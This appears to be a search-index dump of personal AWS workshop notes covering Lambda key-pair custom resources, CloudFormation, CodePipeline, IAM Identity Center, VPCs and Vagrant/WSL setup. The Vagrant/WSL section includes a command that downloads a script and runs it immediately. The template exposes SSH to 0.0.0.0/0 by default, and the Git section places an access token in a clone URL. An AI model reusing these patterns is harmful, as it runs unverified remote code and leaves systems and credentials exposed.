pem_key_name = event[\u0026#39;ResourceProperties\u0026#39;][\u0026#39;KeyName\u0026#39;] response = \u0026#39;FAILED\u0026#39; ec2 = boto3.client(\u0026#39;ec2\u0026#39;) if event[\u0026#39;RequestType\u0026#39;] == \u0026#39;Create\u0026#39;: try: print(\u0026#34;Creating key name %s\u0026#34; % str(pem_key_name)) key = ec2.create_key_pair(KeyName=pem_key_name) key_material = key[\u0026#39;KeyMaterial\u0026#39;] ssm_client = boto3.client(\u0026#39;ssm\u0026#39;) param = ssm_client.put_parameter( Name=pem_key_name, Value=key_material, Type=\u0026#39;SecureString\u0026#39;) print(param) print(f\u0026#39;The parameter {pem_key_name} has been created.\u0026#39;) response = \u0026#39;SUCCESS\u0026#39; except Exception as e: print(f\u0026#39;There was an error {e} creating and committing \u0026#39; +\\ f\u0026#39;key {pem_key_name} to the parameter store\u0026#39;) log_exception() response = \u0026#39;FAILED\u0026#39; send_response(event, context, response) return if event[\u0026#39;RequestType\u0026#39;] == \u0026#39;Update\u0026#39;: # Do nothing and send a success immediately send_response(event, context, response) return if event[\u0026#39;RequestType\u0026#39;] == \u0026#39;Delete\u0026#39;: #Delete the entry in SSM Parameter store and EC2 try: print(f\u0026#34;Deleting key name {pem_key_name}\u0026#34;) ssm_client = boto3.client(\u0026#39;ssm\u0026#39;) rm_param = ssm_client.delete_parameter(Name=pem_key_name) print(rm_param) _ = ec2.delete_key_pair(KeyName=pem_key_name) response = \u0026#39;SUCCESS\u0026#39; except Exception as e: print(f\u0026#34;There was an error {e} deleting the key {pem_key_name} \u0026#39; +\\ from SSM Parameter store or EC2\u0026#34;) log_exception() response = \u0026#39;FAILED\u0026#39; send_response(event, context, response) def lambda_handler(event, context): \u0026#34;Lambda handler for the custom resource\u0026#34; try: return custom_resource_handler(event, context) except Exception: log_exception() raise Code \u0026gt; Deploy\nCopy Funtion ARN\n3.2 Create Stack\nCloudFormation \u0026gt; Create stack \u0026gt; With new resource (standard)\nNew file: custom_resource_cfn_mr.yml expand code : Parameters: SourceAccessCIDR: Type: String Description: The CIDR IP range that is permitted to access the instance. We recommend that you set this value to a trusted IP range. Default: 0.0.0.0/0 SSHKeyName: Type: String Description: The name of the key that will be created Default: MyKey01 AMIID: Type: String Description: The AMI ID that will be used to create EC2 instance Default: AMIID VPCPublicSubnet: Type: AWS::EC2::Subnet::Id Description: Choose a public subnet in the selected VPC VPC: Type: AWS::EC2::VPC::Id Description: The VPC in which to launch the EC2 instance. We recommend you choose your default VPC. FunctionArn: Type: String Description: The ARN of the lambda function that implements the custom resource Resources: SSHKeyCR: Type: Custom::CreateSSHKey Version: \u0026#34;1.0\u0026#34; Properties: ServiceToken: !Ref FunctionArn KeyName: !Ref SSHKeyName MyEC2Instance: Type: AWS::EC2::Instance Properties: KeyName: !Ref SSHKeyName InstanceType: t2.micro ImageId: !Ref AMIID IamInstanceProfile: !Ref EC2InstanceProfile SecurityGroupIds: - !Ref EC2InstanceSG SubnetId: !Ref VPCPublicSubnet Tags: - Key: Name Value: Cfn-Workshop-Reinvent-2018-Lab1 DependsOn: SSHKeyCR EC2InstanceProfile: Type: AWS::IAM::InstanceProfile Properties: Roles: - Ref: EC2InstanceRole Path: \u0026#34;/\u0026#34; DependsOn: EC2InstanceRole EC2InstanceRole: Type: AWS::IAM::Role Properties: Policies: - PolicyDocument: Version: \u0026#39;2012-10-17\u0026#39; Statement: - Action: - s3:GetObject Resource: \u0026#34;*\u0026#34; Effect: Allow PolicyName: s3-policy - PolicyDocument: Version: \u0026#39;2012-10-17\u0026#39; Statement: - Action: - logs:CreateLogStream - logs:GetLogEvents - logs:PutLogEvents - logs:DescribeLogGroups - logs:DescribeLogStreams - logs:PutRetentionPolicy - logs:PutMetricFilter - logs:CreateLogGroup Resource: - arn:aws:logs:*:*:* - arn:aws:s3:::* Effect: Allow PolicyName: cloudwatch-logs-policy - PolicyDocument: Version: \u0026#39;2012-10-17\u0026#39; Statement: - Action: - ec2:AssociateAddress - ec2:DescribeAddresses Resource: - \u0026#34;*\u0026#34; Effect: Allow PolicyName: eip-policy Path: \u0026#34;/\u0026#34; AssumeRolePolicyDocument: Statement: - Action: - sts:AssumeRole Principal: Service: - ec2.amazonaws.com Effect: Allow Version: \u0026#39;2012-10-17\u0026#39; EC2InstanceSG: Type: AWS::EC2::SecurityGroup Properties: GroupDescription: This should allow you to SSH to the instance from your location VpcId: !Ref VPC Tags: - Key: Name Value: !Sub ${AWS::StackName} SecurityGroupIngress: - Description: This should allow you to SSH from your location into an EC2 instance CidrIp: !Ref SourceAccessCIDR FromPort: 22 IpProtocol: tcp ToPort: 22 Outputs: MyEC2InstanceDNSName: Description: The DNSName of the new EC2 instance Value: !GetAtt MyEC2Instance.PublicDnsName MyEC2InstancePublicIP: Description: The Public IP address of the newly created EC2 instance Value: !GetAtt MyEC2Instance.PublicIp Preresuisite - Prepare template\nTemplate is ready Upload a template file: custom_resource_cfn_mr.yml Stack name: ssh-key-gen-cr Create stack AMI ID: FuntionArn: SSHKeyName: MyKey01 SourceAccessCIDR: 0.0.0.0/0 VPC: VPCPublicSubnet: I acknowledge \u0026hellip;\u0026gt; Submit CREATE STACK EC2 - Launch Instances : Copy AMI ID\nCloudFormation \u0026gt; Stacks \u0026gt; ssh-key-gen-cr\nEvents Check EC2 instance created\n3.3 Connect EC2 instances\nAWS Systems Manager - Parameter Store Name: MyKey01 Overview \u0026gt; Value \u0026gt; Copy code and Save to : cloudformation.pem Use PuTTY Generator load key and Save Private key Conect to EC2 Instance ifconfig -a ping amazon.com -c5 3.4 Mapping and StackSets\n"
},
{
	"uri": "http://localhost:1313/aws-ws/8-devopsaws/8.4-pipeline/",
	"title": "CodePipleline",
	"tags": [],
	"description": "",
	"content": "Overview CodePipeline is a continuous delivery tool, and it shows a visual workflow so we understand how to orchestrate our pipeline using it. You can find sources such as GitHub, CodeCommit, or Amazon S3, and then you can build using technologies such as CodeBuild, or Jenkins, and so on. CodeBuild CodeCommit and CodeDeploy Develop Tools \u0026gt; CodePipeline \u0026gt; Pipelines \u0026gt; Create new pipeline Pipeline name: cicd-pipeline Service role: New service role Role name: AWSCodePipelineServiceRole-us-east-1-cicd-pipeline Next Advanced settings Bucket: cicddevopsartifacts Source: AWS CodeCommit Repository name: cicd-repo Branch name: master Next Build provider: Skip step Next Deploy provider: AWS CodeDeploy Application name: CodeDeployDemo Deploymeny group: MyDevInstances Next - Create pipeline CodePipeline Edit and Comming index.html Check Pipelines is processing Add CodeBuild Editing: cicd-pipeline Edit: Deploy - Add Stage - Stage name: Test Edit: Test Add action group Action name: TestforWelcome Action provider: AWS CodeBuild Input artifacts: SourceArtifact Project name: DevOpsAppBuild Output artifacts: TestResults -\u0026gt; DONE SAVE\nRelease change \u0026gt; Release\nCodeBuild check:\nBuild \u0026gt; Build projects \u0026gt; Build project Check Permission IAM - Roles - codebuild-DevOpsAppBuild-service-role Edit policy Resource: All resources Run Codepile again Check Build history Pipeline Deploy Test Issue: Index.html Commit Changes Check Pipeline process Check build history Issue : \u0026ldquo;Welcome\u0026rdquo; Edit index.htm Pipeline Build project Manual approval steps Pipeline: cicd-pipeline - Edit - Add stage \u0026gt; Stage name: DeploytoProd Add action group \u0026gt; Action name: DeplotToProd Add action group\nAction name: manualApproval Action provider: Manual approval SNS topic ARN - optional : \u0026hellip;Default_CloudWatch_Alarms_Topic URL for review - optional: http://ec2-18-232-147-162.compute-1.amazonaws.com/ Comments - optional: Please review and Approve if Happy with the changes -\u0026gt; DONE -\u0026gt; Save -\u0026gt; Release change\nPipeline Release "
},
{
	"uri": "http://localhost:1313/aws-ws/5-cloudquest/5.1-compute/5.1.4-diy/",
	"title": "DIY",
	"tags": [],
	"description": "",
	"content": "DIY Activities Rename index.html to waves.html\nSolution Validation Method Validation Process:\nOur test servers will validate that you renamed index.html to waves.html. (A successful validation will find waves.html in your S3 bucket.)\nHints:\nUse the Actions dropdown menu to rename index.html to waves.html, and then type the website bucket name into the validation field. The bucket name begins with website-bucket- "
},
{
	"uri": "http://localhost:1313/aws-ws/2-prepair/2.4-git/",
	"title": "Git",
	"tags": [],
	"description": "",
	"content": "GitHub GitHub is a web-based platform built on top of Git, the distributed version control system. It offers a variety of features to help developers collaborate on software projects\nGitHub provides a platform for hosting Git repositories. Developers can create new repositories to store their code, either publicly (visible to everyone) or privately (accessible only to authorized collaborators)\nGitHub Actions is a continuous integration tool that allows developers to automate tasks for their web projects. In this course, learn how to use this powerful tool to build workflows triggered by events, develop a continuous integration and continuous delivery (CI/CD) pipeline, and create custom actions.\nCreate a repo : Create accesskey : Clone repo to local :\ngit clone https://\u0026lt;access token\u0026gt;U@github.com/nonotnonez/thegithub.git Create a README.md file : Copy Source and Push to git repo:\ngit add .\rgit commit -m \u0026#39;first check in\u0026#39;\rgit push First action Setup Github actions: https://github.com/nonotnonez/thegithub/actions/new\nChoose: Simple workflow -\u0026gt; Configure Change name blank.yml to hello.yml and Commit changes Click Actions to see the results Workflow and actions attributes\nname: The name of the workflow Not required on: The Github event that triggers the workflow Required On Events: Repository events push pull_request release Webhooks branch creation issues members Scheduled Cron format Jobs: Workflows must have at least one job Each job must have a identifier Must start with a letter or underscore Can only contain alphanumeric character,-,or_ runs-on: The type of machine needed to run the job Runners: Windows Server 2019 Ubuntu 18.04 macOS Catalina 10.15 Self-hosted runners steps List of actions or commands Access to the file system Each step runs in its own process uses Identifies an action to use Defines the location of that action run runs commands in the vitual environment\u0026rsquo;s shell name an optional identifier for the step "
},
{
	"uri": "http://localhost:1313/aws-ws/4-cleanup/4.1-ec2/",
	"title": "IaC",
	"tags": [],
	"description": "",
	"content": "Clean up resources We will process to clearn up all the resources\nTerraform: Run docker compose:\ndocker-compose run --rm terraform destroy --auto-approve AWS Checking "
},
{
	"uri": "http://localhost:1313/aws-ws/10-awssecuview/10.4-iic/",
	"title": "IAM Identity Center",
	"tags": [],
	"description": "",
	"content": "Best practices Security, Identity \u0026amp; Compliance \u0026gt; IAM Identity Center \u0026gt; Enable Settings \u0026gt; Authentication (By default, it requires users to register an MFA device at sign in \u0026ndash;\u0026gt; Change to lab env) Multi-facor auhentication \u0026gt; Configure MFA Settings \u0026gt; Allow them to sign in SAVE CHANGES Users : Add user Username: tuanta Password: Generate a one-time password that you can share with this user Input user info NEXT Add user to group NEXT (A permission set is a collection of one or more IAM policies)\nIAM Identity Center \u0026gt; Multi-account permissions \u0026gt; Permission sets \u0026gt; Create permission set Permission set type: Pridefined permission set Policy for predefined permission set: ReadOnlyAccess NEXT Session duration: 1 hour NEXT - CREATE Assign to User:\nIAM Identity Center \u0026gt; Multi-account permissions \u0026gt; AWS Account Select User: XXX \u0026gt; Assign users to groups User : Select User: XXX \u0026gt; NEXT Permission set: ReadOnlyAccess \u0026gt; NEXT \u0026gt; SUBNMIT Grant access to AWS or Customer-managed :\nIAM Identity Center \u0026gt; Dashboard AWS Access portal URL: Login username / password (change at first time login) IAM Identity Center Without a centralized identity solution, users must remember credentials for each account. IAM Identity Center centralizes access management for multiple AWS accounts, AWS applications, and SAML-enabled cloud applications. Ex: Salesforce, Microsoft 365 \u0026hellip; IAM Identity Center was previously known as AWS Single Sign-On Identity Sources for IAM Identity Center\nIdentity Center directory Active Directory External identity provider Ex: Okta or Microsoft Entra ID IAM Identity Center can be used with or without AWS Organizations\n"
},
{
	"uri": "http://localhost:1313/aws-ws/4-cleanup/",
	"title": "Resource Cleanup",
	"tags": [],
	"description": "",
	"content": "Clean up resources All processing to clearn up all the resources\nContent IAC CICD "
},
{
	"uri": "http://localhost:1313/aws-ws/12-automate/12.4-step/",
	"title": "Step Functions",
	"tags": [],
	"description": "",
	"content": "Orchestrating with Step Functions Orchestration involves coordinating and maintaining interconnected tasks to accomplish a specific workflow.\nIngestion -\u0026gt; Validation -\u0026gt; Transformation -\u0026gt; Storage AWS Step Functions is a serverless orchestration service.\nStep Functions allows you to coordinate the components of distributed applications and microservices using visual workflows\nUse Cases Demo AWS Step Functions \u0026gt; Get started Create your own - Drag and drop Actions: Lambda Invoke State name: Validate Payment Flow: Choice Actions: SNS Public State name: Send failed with retry link Search: Amazon DynamoDB - Updateitem State name: Update Inventory Actions: SNS Public State name: Notify shipping company Actions: Lambda Invoke State name: Generate invoice Actions: SNS Public State name: Send success email with invoice Flow: Success Flow: Fail "
},
{
	"uri": "http://localhost:1313/aws-ws/12-automate/12.5-sm/",
	"title": "AWS System Manager",
	"tags": [],
	"description": "",
	"content": "AWS Systems Manager AWS Systems Manager allows you to centeally view and manage resource in AWS and multicloud hybrid environments. Demo : Let\u0026rsquo;s execute a runbook that will enable versioning on S3 buckets System Manager - Automation - Excute automation Choose runbook : AWS-ConfigureS3BucketVersioning Execute automation runbook : Rate control Targets: Parameter: BucketName Targets: Tags Specify instance tag key: Environment Specify tag value (optional): Production ADD AutomationAssumeRole (no need with admin) EXCUTE "
},
{
	"uri": "http://localhost:1313/aws-ws/4-cleanup/4.2-jenkins/",
	"title": "CICD",
	"tags": [],
	"description": "",
	"content": "We are processing \u0026hellip;.\n"
},
{
	"uri": "http://localhost:1313/aws-ws/5-cloudquest/",
	"title": "Cloud Quest",
	"tags": [],
	"description": "",
	"content": "CLOUD Quest - Cloud Practitioner Cloud Practitioners will build basic cloud solutions using AWS services. You will learn about AWS Cloud concepts, security concepts, common use cases, billing and pricing models and business impacts.\nLearning Objectives For each assignment, you will receive an automated account to build a new solution on the AWS console. 1 - Cloud Computing Essentials : Create Amazon EC2 instances to run the computational modules for the island stabilization system. Each instance should be placed in a different Availability Zone in same Region. 2 - Cloud First: Migrate an existing website to static website hosting on Amazon S3 to improve reliability 3 - Computing Solutions: Increate the size of an Amazon EC2 instance to provide better application performance 4 - Cloud Economics: Configure a price estimate for an architecture that uses a variable amount of Amazon EC2 instances based on peak usage time. 5 - Networking: Review and change VPC network configurations to fix a connection issue 6 - VPCs: Allow communication between application hosted in different VPCs by using VPC perring. The Marketing and Developer EC2 instances need to access the Financial Services Server in the Finance department\u0026rsquo;s VPC. 7 - Database: Improve the operational efficiency of databases by using multiple Availability Zones and a read replica. 8 - Security: Use IAM to provide work permissions to engineers by using group settings and the least privilege principle. 9 - File Systems: Deploy and maintain a file systems infratructure that is accessible form three different servers. 10 - NoSQL: Craete a database to help our video streaming team track customer viewing behaviors from metadata, such as movies watched and device type 11 - Auto-healing and Scalling App: Create and configure an Amazon EC2 Auti Scaling group that follows scheduled scaling activities to add and remove EC2 instances. 12 - Highly Available: Increase website reliability by creating a highly available architecture that spans multiple Availability Zones with load balancing and health monitoring. "
},
{
	"uri": "http://localhost:1313/aws-ws/2-prepair/2.5-local/",
	"title": "Local",
	"tags": [],
	"description": "",
	"content": "VSCode \u0026amp; WSL Windows Subsystem for Linux (WSL) is a compatibility layer developed by Microsoft for running Linux binary executables natively on Windows 10 and Windows Server 2019. It enables developers to run a Linux distribution alongside their existing Windows system without the need for dual-booting or virtual machines.\nConfiguration\nWindows Features\rWindows Subsystem for Linux Vitual machine platform Install\rwsl \u0026ndash;update wsl \u0026ndash;list \u0026ndash;verbose wsl.exe \u0026ndash;install ubuntu wsl.exe \u0026ndash;set-version Ubuntu 2 wsl \u0026ndash;set-default ubuntu VSCode\rCtrl Shift P Add New WSL Window Vagrant \u0026amp; VirtualBox We will use local environment with Vagrant and VirtualBox to test best practices.\nVagrant : is an open-source tool for building and managing virtualized development environments. It helps developers create and configure reproducible and portable development environments that closely mimic production setups.\nVirtualbox :is a powerful open-source virtualization software developed by Oracle Corporation. It allows users to run multiple guest operating systems (OS) simultaneously on a single physical machine.\nConfiguration\n- Machine 1: **Linux-server** - IP: 192.168.33.100 - Memory: 2048 Mb - Machine 2: **Jenkins-server** - IP: 192.168.33.110 - Memory: 4096 Mb - Machine 3: **Monitor-server** - IP: 192.168.33.120 - Memory: 2048 Mb Vagrantfile Expand:\r# -*- mode: ruby -*- # vi: set ft=ruby : Vagrant.configure(\u0026#34;2\u0026#34;) do |config| config.vm.box = \u0026#34;ubuntu/focal64\u0026#34; # Configuration for the first virtual machine config.vm.define \u0026#34;machine1\u0026#34; do |machine1| machine1.vm.network \u0026#34;private_network\u0026#34;, ip: \u0026#34;192.168.33.100\u0026#34; machine1.vm.hostname = \u0026#34;linux-server\u0026#34; machine1.vm.provider \u0026#34;virtualbox\u0026#34; do |vb| vb.memory = \u0026#34;2048\u0026#34; end machine1.vm.synced_folder \u0026#34;./datas\u0026#34;, \u0026#34;/vagrant_data\u0026#34; end # Configuration for the second virtual machine config.vm.define \u0026#34;machine2\u0026#34; do |machine2| machine2.vm.network \u0026#34;private_network\u0026#34;, ip: \u0026#34;192.168.33.110\u0026#34; machine2.vm.hostname = \u0026#34;jenkins-server\u0026#34; machine2.vm.provider \u0026#34;virtualbox\u0026#34; do |vb| vb.memory = \u0026#34;4096\u0026#34; end machine2.vm.synced_folder \u0026#34;./datas\u0026#34;, \u0026#34;/vagrant_data\u0026#34; end # Configuration for the third virtual machine config.vm.define \u0026#34;machine3\u0026#34; do |machine3| machine3.vm.network \u0026#34;private_network\u0026#34;, ip: \u0026#34;192.168.33.120\u0026#34; machine3.vm.hostname = \u0026#34;monitor-server\u0026#34; machine3.vm.provider \u0026#34;virtualbox\u0026#34; do |vb| vb.memory = \u0026#34;2048\u0026#34; end machine3.vm.synced_folder \u0026#34;./datas\u0026#34;, \u0026#34;/vagrant_data\u0026#34; machine3.vm.provision \u0026#34;shell\u0026#34;, inline: \u0026lt;\u0026lt;-SHELL apt-get update SHELL end end Run\nvagrant up vagrant status vagrant ssh vagrant halt\rvagrant reload\rfor upgrade Ram, CPU\nvagrant destroy -f\rDestroy all machine\nWindows WSL \u0026amp; Vagrant Requirements\rWindows 10 Virtualbox WSL 2 Vagrant Vagrant plugin: vitualbox_WSL2 Install VirtualBox Install WSL2: wsl -l -v Install Powershell Preview Invoke-Expression \u0026#34;\u0026amp; { $(Invoke-Restmethod https://aka.ms/install-powershell.ps1) } -UseMSI -Preview\u0026#34; Install Vagrant (PS) # run inside WSL 2 # check https://www.vagrantup.com/downloads for more info curl -fsSL https://apt.releases.hashicorp.com/gpg | sudo apt-key add - sudo apt-add-repository \u0026#34;deb [arch=amd64] https://apt.releases.hashicorp.com $(lsb_release -cs) main\u0026#34; sudo apt-get update \u0026amp;\u0026amp; sudo apt-get install vagrant Update Vagrant (PS): vagrant --version choco install vagrant --version 2.4.1 Enable WSL 2 support (The Terminal on WSL2) # append those two lines into ~/.bashrc echo \u0026#39;export VAGRANT_WSL_ENABLE_WINDOWS_ACCESS=\u0026#34;1\u0026#34;\u0026#39; \u0026gt;\u0026gt; ~/.bashrc echo \u0026#39;export PATH=\u0026#34;$PATH:/mnt/c/Program Files/Oracle/VirtualBox\u0026#34;\u0026#39; \u0026gt;\u0026gt; ~/.bashrc # now reload the ~/.bashrc file source ~/.bashrc Install virtualbox_WSL2 plugin (The Terminal on WSL2) # Install virtualbox_WSL2 plugin vagrant plugin install virtualbox_WSL2 Install and configured (The Terminal on WSL2) Configuring\r# Go to Windows user\u0026#39;s dir from WSL cd /mnt/c/Users/\u0026lt;my-user-name\u0026gt;/ # Create a project dir mkdir -p projects/vagrant-demo cd projects/vagrant-demo # Create a Vagrantfile using Vagrant CLI vagrant init hashicorp/bionic64 ls -l Vagrantfile # Start a VM using Vagrantfile vagrant up # Login to the VM # (password is \u0026#39;vagrant\u0026#39;) vagrant ssh # Done :) Processing\rVagrantfile Vagrantfile (WSL): # -*- mode: ruby -*- # vi: set ft=ruby : Vagrant.configure(\u0026#34;2\u0026#34;) do |config| # Machine 1 configuration config.vm.define \u0026#34;machine1\u0026#34; do |machine1| machine1.vm.box = \u0026#34;hashicorp/bionic64\u0026#34; machine1.vm.hostname = \u0026#34;machine1\u0026#34; machine1.vm.network \u0026#34;private_network\u0026#34;, ip: \u0026#34;192.168.56.101\u0026#34; machine1.vm.provider \u0026#34;virtualbox\u0026#34; do |vb| vb.memory = 1024 vb.cpus = 1 end end # Machine 2 configuration config.vm.define \u0026#34;machine2\u0026#34; do |machine2| machine2.vm.box = \u0026#34;hashicorp/bionic64\u0026#34; machine2.vm.hostname = \u0026#34;machine2\u0026#34; machine2.vm.network \u0026#34;private_network\u0026#34;, ip: \u0026#34;192.168.56.102\u0026#34; machine2.vm.provider \u0026#34;virtualbox\u0026#34; do |vb| vb.memory = 1024 vb.cpus = 1 end end end vagrant ssh machine1 password: vagrant "
},
{
	"uri": "http://localhost:1313/aws-ws/5-cloudquest/5.5-networking/",
	"title": "Networking Concepts",
	"tags": [],
	"description": "",
	"content": "Business Request Help the bank setup a secure networking environment which allows communication between resources and the internet.\nLearning Objectives Define key features of VPCs, subnets, internet gateways and route tables. Describe the benefits of using Amazon VPCs. State the basics of CIDR block notation and IP addressing. Explain how VPC traffic is routed and secured using gateways, network access control lists, and security groups. "
},
{
	"uri": "http://localhost:1313/aws-ws/13-ha/13.5-storage/",
	"title": "Storage",
	"tags": [],
	"description": "",
	"content": "\nMost S3 storage classes are designed for at leat 99.9% availability Amazon EBS provides block-level storage volumes for EC2 instances Consider cost when choosing cloud storage "
},
{
	"uri": "http://localhost:1313/aws-ws/10-awssecuview/10.5-vpc/",
	"title": "VPC and Subnets",
	"tags": [],
	"description": "",
	"content": "Best practices Overviews\nUsers in the other account can deploy resources in the shared subnet.\nProcess\nVPC \u0026gt; Your VPCs \u0026gt; Create VPC\nName tag: ProdVPC IPv4 CIDR: 10.0.0.0/16 Tags Key: Name Value: ProVPC CREATE VPC VPC \u0026gt; Subnets \u0026gt; Create Subnet\nVPC ID: ProVPC Subnet name: Subnet-A Availability Zone: us-east-1a IPv4 VPC CIDR block: 10.0.0.0/16 IPv4 subnet CIDR block: 10.0.1.0/24 Tags Key: Name Value: Subnet-A VPC \u0026gt; Subnets \u0026gt; Create Subnet\nVPC ID: ProVPC Subnet name: Subnet-B Availability Zone: us-east-1b IPv4 VPC CIDR block: 10.0.0.0/16 IPv4 subnet CIDR block: 10.0.2.0/24 Tags Key: Name Value: Subnet-B Resource Acess Manager\nSetting Enable sharing with AWS Organizations Resource shares \u0026gt; Create resource share Name: Shared_subnet Resources: Subnets Check Subnet-A NEXT Managed permission for ec2:Subnet NEXT Grant access to principals Allow sharing only within your organization Display organizational structure Select OU or Account NEXT CREATE RESOURCE SHARE Vitual Private Cloud (VPC) Logically isolated virutal network Resides in a singel AWS Region Contains subnets Subnets\nRange of IP address in the VPC Resides in a single Availability Zone Designing VPCs and Subnets\nNetwork isolation VPCs are isolated Use VPCs to segregate resources IP addressing Choose a CIDR block that is large enough VPCs are isolated but can be peered if their IP ranges don\u0026rsquo;t overlap Subnets can be public or private Public subnets Have a route to an internet gateway allowing access to the internet Allow incomming connections from the internet Are typically used by web servers Private subnets Have a route to a network address translation (NAT) device allowing to the internet Do not allow connections originating from the internet Are typically used by database servers Security Use security groups and network access control list (NACLs) to filter inbound and outbound traffic Security groups are applied to instances NACLs are applied to subnets Connectivity VPC peering allows direct connectivity between VPCs Peering VPCs may belong to the same or different AWS accounts Use AWS VPN or AWS Direct Connect to connect with an on-premises environment Use AWS VPN to create an IPsec site-to-site VPN with your on-premises network Use AWS Direct Connect to create a dedicated private connection with your on-premises network High Availability Spread resources in multiple subnets to make them highly available and fault tolerant Use services like Elastic Load Balancing and Auto Scaling Compliance Consider regulatory requirements, such as data residency For example, if you\u0026rsquo;re a bank operating in the U.K. you may be required to host your resources and data in an AWS region in the U.K. Architectual Considerations You can bring your IPv4 and IPv6 addresses to your AWS account Subnets can be shared with other accounts in the same AWS organization "
},
{
	"uri": "http://localhost:1313/aws-ws/12-automate/12.6-as/",
	"title": "Auto Scalling",
	"tags": [],
	"description": "",
	"content": "Auto Scaling AWS Auto Scaling automatically scales resource based on your scaling strategy\nAmazon EC2 Auto Scaling can be used to scale EC2 instances.\nDemo AWS Auto Scaling - Create a scaling plan Find scalable resources: Choose a method: Search by tag Key: Environment Value: Production NEXT Specify scaling strategy Name: Scale-DynamoDB NEXT Configure advanced settings Check: Replace external scaling policies Uncheck: Disable scale-in NEXT CREATE SCALING PLAN Amazon EC2 Auto Scaling "
},
{
	"uri": "http://localhost:1313/aws-ws/6-wsaudio/",
	"title": "AWS Workshop Studio",
	"tags": [],
	"description": "",
	"content": "Cloud DevSecOps Cloud DevSecOps extends the principles of DevSecOps to cloud environments. It focuses on securing applications and infrastructure deployed in the cloud by integrating security practices into cloud-native development and operations processes. Automation, continuous security, compliance, and collaboration are key components, ensuring that cloud-based applications are developed, deployed, and maintained securely and compliantly.\nLinks: https://catalog.us-east-1.prod.workshops.aws/workshops/e31afbdf-ee40-41fa-a6c9-6ba2cb55fc1e/en-US/2-setup\n"
},
{
	"uri": "http://localhost:1313/aws-ws/5-cloudquest/5.6-vpc/",
	"title": "Connecting VPCs",
	"tags": [],
	"description": "",
	"content": "VPCs Amazon VPC Overview Amazon VPC Concepts Amazon VPC Security Amazon VPC - Internet Connectivity Amazon VPC Peering Connections "
},
{
	"uri": "http://localhost:1313/aws-ws/13-ha/13.6-db/",
	"title": "Database",
	"tags": [],
	"description": "",
	"content": "Security Databases against Failures "
},
{
	"uri": "http://localhost:1313/aws-ws/10-awssecuview/10.6-vpn/",
	"title": "VPN and Direct Connect",
	"tags": [],
	"description": "",
	"content": "Best practices Use site-to-site VPN if you need a cost-effective solution and your applications aren\u0026rsquo;t demanding.\nPrefer Direct Connect if you need a dedicated connection and your applications are data/performance-intensive\nVPN and Direct Connect AWS Site-to-Site VPN Secure connect between on-premises equiment and your VPCs Created within your AWS account and attached to a VPC Virtual private gateway is the termination point on the AWS side Created within your AWS account and attached to a VPC The customer gateway is a physical device or software application on your side Each site-to-site VPN has two tunnels, each terminating in a different Availability Zone When one tunnel becomes unavailable, network traffic is automatically routed to the other tunnel Architectural Considerations\nPerformance Cost Security AWS Direct Connect\nDedicated connection between your on-premises network and AWS Bypass the public internet Consider when you have applications that need high performance and low latency AWS Direct Connect Pricing\nCapacity - maximum rate that data can be transferred Port hours - time that a port is provisioned https://aws.amazon.com/directconnect/pricing/ Use site-to-site VPN if you need a cost-effective solution and your applications aren\u0026rsquo;t demanding.\nPrefer Direct Connect if you need a dedicated connection and your applications are data/performance-intensive\n"
},
{
	"uri": "http://localhost:1313/aws-ws/13-ha/13.7-backup/",
	"title": "Backing Up",
	"tags": [],
	"description": "",
	"content": "AWS Backup AWS Backup Settings \u0026gt; Configure resources Backup plans \u0026gt; Create backup plan Build a new plan Backup plane name: Daily-EBS-Snapshot Schedule Backup rule name: backup-at-11AM Total retention period: 1 Days CREATE PLAN \u0026gt; ASSIGN RESOURCES Backup plans \u0026gt; Daily-EBS-Snapshots \u0026gt; Assign resources name: daily-backups-for-all-ebs-volumes IAM role: Default role Defind resource selection : Include specific resource: EBS ASSIGNMENT RESOURCE Protectd resources \u0026gt; Create on-demanded backup Resource type: EBS Volume ID: vol-07c\u0026hellip; Backup windows \u0026gt; Create backup now \u0026gt; 1 Days CREATE ON-DEMAND BACKUP Security Databases against Failures AWS Backup allows you to centralize and automate backups across AWS services "
},
{
	"uri": "http://localhost:1313/aws-ws/5-cloudquest/5.7-database/",
	"title": "Databases in Practice",
	"tags": [],
	"description": "",
	"content": "Business Request Improve the insurance company\u0026rsquo;s relational database operations, performance, and availability.\nLearning Objectives Review the features, benefits and database types available with Amazon RDS. Describe vertical and horizontal scaling on Amazon RDS. Use Amazon RDS read replicas to increase database performance. Implement multi-AZ deployments of Amazon RDS to increase availability. "
},
{
	"uri": "http://localhost:1313/aws-ws/7-fcj/",
	"title": "First Cloud Journey",
	"tags": [],
	"description": "",
	"content": "First Cloud Journey Links: https://cloudjourney.awsstudygroup.com/\n1.Understand AWS CloudFormation Allows you to build and manage your data center via code\nAWS CloudFormation 2.AWS Elastic Load Balancers ELB 3.AWS Auto Scaling Auto Scaling 4.AWS Security Groups Auto Scaling 5.SSH Key Authentication Authentication "
},
{
	"uri": "http://localhost:1313/aws-ws/10-awssecuview/10.7-secu/",
	"title": "Security Group and Network ACLs",
	"tags": [],
	"description": "",
	"content": "Best practices NACLs and Security Groups Network ACLs Allow or deny inbound and outbound traffic at the subnet level All VPCs have a default NACL that allows all traffic Default NACL can be modified Custom NACLs can be created A NACL can be associated with multiple subnets A subnet can be only be associated with one NACL Each rule has a rule number Rules are evaluated in order, starting with the lowest number NACLs are stateless This means they do not maintain traffic state information works at the subnet level If inbound traffic is allowed, it can reach all instances in the subnet Do not evaluate traffic routed within a subnet It only applies to traffic entering or leaving the subnet For example: here is an EC2 instance in a subnet. A network ACL rule allows specific outbound traffic, but responses to that traffic are not automatically allowed, so traffic must be explicitly allowed in both directions. Security Groups Control what traffic is allowd to reach and leave resources Can only contain allow rules Anything not explicitly allowed is denied Can be used by multiple resources Multiple security groups can be associated with a resource Are stateful They maintain traffic state infomation For example, if outbound traffic is allowed by a security group rule, the corresponding response traffic is automatically allowed\n"
},
{
	"uri": "http://localhost:1313/aws-ws/5-cloudquest/5.8-security/",
	"title": "Core Security Concepts",
	"tags": [],
	"description": "",
	"content": "AWS Identity and Access Managêmnt (IAM) AWS Security and Complicance Overview AWS Share Responsibility Model Overview AWS IAM - Overview AWS IAM - Manage Permissions AWS IAM - Manage IAM Roles AWS IAM Features - Access Analysis "
},
{
	"uri": "http://localhost:1313/aws-ws/8-devopsaws/",
	"title": "DevOps On AWS",
	"tags": [],
	"description": "",
	"content": " CI/CD stands for continuous integration, and then continuous delivery or deployment. It is a method used to frequently and reliably deliver software applications "
},
{
	"uri": "http://localhost:1313/aws-ws/10-awssecuview/10.8-key/",
	"title": "Security keys and credentials",
	"tags": [],
	"description": "",
